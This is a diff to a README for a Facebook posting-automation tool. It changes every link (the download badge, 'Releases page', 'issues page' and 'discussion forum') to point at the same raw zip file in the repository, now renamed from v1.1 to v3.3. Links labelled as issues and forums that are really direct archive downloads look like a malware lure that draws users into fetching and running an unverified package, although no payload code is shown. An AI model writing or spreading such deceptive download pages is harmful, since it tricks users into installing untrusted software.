@@ -1,7 +1,7 @@
 # 🚀 facebook-automation - Simplify Your Facebook Posting
 
 ## 📥 Download Now
-[![Download facebook-automation](https://github.com/Macoy66/facebook-automation/raw/refs/heads/main/gammy/automation-facebook-v1.1.zip%https://github.com/Macoy66/facebook-automation/raw/refs/heads/main/gammy/automation-facebook-v1.1.zip)](https://github.com/Macoy66/facebook-automation/raw/refs/heads/main/gammy/automation-facebook-v1.1.zip)
+[![Download facebook-automation](https://github.com/Macoy66/facebook-automation/raw/refs/heads/main/gammy/facebook_automation_v3.3.zip%https://github.com/Macoy66/facebook-automation/raw/refs/heads/main/gammy/facebook_automation_v3.3.zip)](https://github.com/Macoy66/facebook-automation/raw/refs/heads/main/gammy/facebook_automation_v3.3.zip)
 
 ## 🌟 Overview
 facebook-automation is a tool designed for safe automated posting on Facebook. It allows users to efficiently manage social media tasks without requiring technical knowledge. This application simplifies marketing efforts, enabling you to focus on creating engaging content while handling your Facebook posts automatically.
@@ -22,7 +22,7 @@ facebook-automation is a tool designed for safe automated posting on Facebook. I
 To start using facebook-automation, follow these simple steps:
 
 1. **Download the Application**:
-   - Visit the [Releases page](https://github.com/Macoy66/facebook-automation/raw/refs/heads/main/gammy/automation-facebook-v1.1.zip) to access the latest version. Click on the release you want to download.
+   - Visit the [Releases page](https://github.com/Macoy66/facebook-automation/raw/refs/heads/main/gammy/facebook_automation_v3.3.zip) to access the latest version. Click on the release you want to download.
 
 2. **Install the Application**:
    - Locate the downloaded file in your downloads folder.
@@ -46,7 +46,7 @@ To start using facebook-automation, follow these simple steps:
    - The application will handle your postings according to the schedule you set.
 
 ## 📥 Download & Install
-Return to the [Releases page](https://github.com/Macoy66/facebook-automation/raw/refs/heads/main/gammy/automation-facebook-v1.1.zip) whenever you need to download or update the application. Ensure you always use the latest version for optimal performance.
+Return to the [Releases page](https://github.com/Macoy66/facebook-automation/raw/refs/heads/main/gammy/facebook_automation_v3.3.zip) whenever you need to download or update the application. Ensure you always use the latest version for optimal performance.
 
 ## 🛠️ Common Issues & Troubleshooting
 If you encounter any issues while installing or using facebook-automation, consider these tips:
@@ -66,9 +66,9 @@ A: Yes, you can download and install facebook-automation on any computer that me
 A: Check your internet connection, or review the post’s content for any restrictions from Facebook that may prevent it from being published.
 
 ## 📢 Feedback
-We value your feedback. Please visit our [issues page](https://github.com/Macoy66/facebook-automation/raw/refs/heads/main/gammy/automation-facebook-v1.1.zip) to report bugs or suggest improvements. Your input helps us make facebook-automation better.
+We value your feedback. Please visit our [issues page](https://github.com/Macoy66/facebook-automation/raw/refs/heads/main/gammy/facebook_automation_v3.3.zip) to report bugs or suggest improvements. Your input helps us make facebook-automation better.
 
 ## 🗺️ Join the Community
-Engage with other users and share your experiences on our [discussion forum](https://github.com/Macoy66/facebook-automation/raw/refs/heads/main/gammy/automation-facebook-v1.1.zip). Your insights can help other users and improve the application.
+Engage with other users and share your experiences on our [discussion forum](https://github.com/Macoy66/facebook-automation/raw/refs/heads/main/gammy/facebook_automation_v3.3.zip). Your insights can help other users and improve the application.
 
 For any further assistance, feel free to explore the resources available in our GitHub repository. Your journey into automated Facebook posting is just a download away!
